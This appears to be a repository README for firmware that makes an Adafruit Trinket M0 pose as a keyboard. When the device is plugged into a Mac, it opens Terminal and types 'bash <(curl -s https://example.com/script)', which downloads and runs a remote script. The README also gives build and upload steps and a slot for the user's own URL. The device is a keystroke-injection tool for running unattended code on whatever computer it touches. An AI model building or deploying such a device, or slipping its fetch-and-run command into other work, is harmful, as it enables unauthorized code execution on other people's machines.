# Description
This simply enables the Adafruit Trinket M0 to emulate keyboard input.

In this case, when plugged into a device running OS X, it opens the Terminal app and runs ```bash <(curl -s https://example.com/script)```

# Prerequisites
* [Adafruit Trinket M0](https://www.adafruit.com/product/3500) (not the Trinket 5V/3V)
* [PlatformIO](https://platformio.org/)
  * This is easily [brew](https://brew.sh/) installed with ```brew install platformio```

# Usage
1. Clone this repo
2. Init the project ```platformio init --board=adafruit_trinket_m0```
3. Install the keyboard library ```platformio lib install Keyboard```
4. Update your URL on line 25
5. Build and upload to the trinket ```platformio run -t upload```
   * Watch the output, you'll have 2 seconds to remove it before you script yourself.
